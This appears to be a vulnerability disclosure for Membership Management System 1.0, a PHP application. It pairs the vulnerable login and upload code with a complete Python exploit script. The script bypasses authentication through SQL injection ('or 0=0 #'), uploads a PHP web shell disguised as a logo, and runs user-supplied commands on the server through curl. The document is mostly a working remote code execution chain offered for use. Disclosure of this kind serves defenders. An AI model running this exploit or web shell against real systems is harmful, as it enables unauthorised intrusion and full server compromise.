---
title: Membership Management System SQL injection + Insecure File Upload = Remote Code Execution
published: true
---

### Creating and operating a demo environment

[ -> link <- ](https://github.com/Sospiro014/zday1/tree/main/Membership_Management_System_demo)


### SQL injection Vulnerability details :
[ -> SQL injection <- ](https://sospiro014.github.io/Membership-Management-System-SQL-injection)

### File upload Vulnerability:

The provided code is part of a Membership Management System. It contains a vulnerability known as "Insecure File Upload." Insecure File Upload vulnerabilities arise when a web application allows users to upload files without proper validation and security measures. In this context, the system accepts file uploads for elements such as logos without adequate scrutiny, potentially allowing malicious files to be uploaded.

### Vulnerability Details:
- Application Name: Membership Management System
- Software Link: [ -> Download Link <- ](https://codeastro.com/membership-management-system-in-php-with-source-code/)
- Vendor Homepage: [ -> Vendor Homepage <- ](https://codeastro.com/author/nbadmin/)
- Date: 14.03.2024
- Exploit Author: SoSPiro
- Bugs: SQL injection + Insecure File Upload = Remote Code Execution
- Version: 1.0
  
### The vulnerability lies in the following code snippet:

- Sql injection Section `MembershipM-PHP/index.php`

```php
$email = $_POST['email'];
$password = $_POST['password'];

$hashed_password = md5($password);
$sql = "SELECT * FROM users WHERE email = '$email' AND password = '$hashed_password'";
```

- File Upload Section
`MembershipM-PHP/settings.php`

```php
if (isset($_FILES['logo']) && $_FILES['logo']['error'] === UPLOAD_ERR_OK) {
    $logoName = $_FILES['logo']['name'];
    $logoTmpName = $_FILES['logo']['tmp_name'];
    $logoType = $_FILES['logo']['type'];
    $uploadPath = 'uploads/';

    $targetPath = $uploadPath . $logoName;
    if (move_uploaded_file($logoTmpName, $targetPath)) {
        $updateSettingsQuery = "UPDATE settings SET system_name = '$systemName', logo = '$targetPath', currency = '$currency' WHERE id = 1";
        $updateSettingsResult = $conn->query($updateSettingsQuery);

        if ($updateSettingsResult) {
            $successMessage = 'System settings updated successfully.';
        } else {
            $errorMessage = 'Error updating system settings: ' . $conn->error;
        }
    } else {
        $errorMessage = 'Error moving uploaded file.';
    }
}

```

### Exploit :


```python
from requests_toolbelt.multipart.encoder import MultipartEncoder
import requests
import string
import random
import os


# generate random string 8 chars
def randomGen(size=8, chars=string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

# generating a random username and a random web shell file
shellFile = randomGen() + ".php"

# creating a payload for the login
payload = {
    "email": "test@mail.com' or 0=0 #",
    "password": "a",
    "login": ""
}

session = requests.Session()

# changeme
urlBase = "http://172.17.86.197/" # change this target ip :)

# login
url = urlBase + "index.php"
print("=== executing SQL Injection ===")
req = session.post(url, payload, allow_redirects=False)

# check if 'Set-Cookie' header is present in the response
if 'Set-Cookie' in req.headers:
    cookie = req.headers["Set-Cookie"]
    print("=== authenticated admin cookie:" + cookie + " ===")
else:
    print("Set-Cookie header not found in the response.")
    exit()

# upload shell
url = urlBase + "settings.php"

# Get user input for the command to execute
cmd_input = input("Enter the command to execute: ")

# PHP code to execute the command received from the user
php_code = "<?php if(isset($_REQUEST['cmd'])){$cmd = ($_REQUEST['cmd']); system($cmd);die; }?>"

mp_encoder = MultipartEncoder(
    fields={
        "systemName": "Membership System",
        "currency": "$",
        "logo": (shellFile, php_code, "application/x-php"),
        "updateSettings": ""
    }
)

headers = {
    "Cookie": cookie,
    'Content-Type': mp_encoder.content_type
}

print("=== login user and uploading shell " + shellFile + " ===")
req = session.post(url, data=mp_encoder, allow_redirects=False, headers=headers)

# curl the shell for test
requestUrl = "curl " + urlBase + "uploads/" + shellFile + "?cmd=" + cmd_input
print("=== issuing the command: " + requestUrl + " ===")

print("=== CURL OUTPUT ===")
os.system(requestUrl)

```




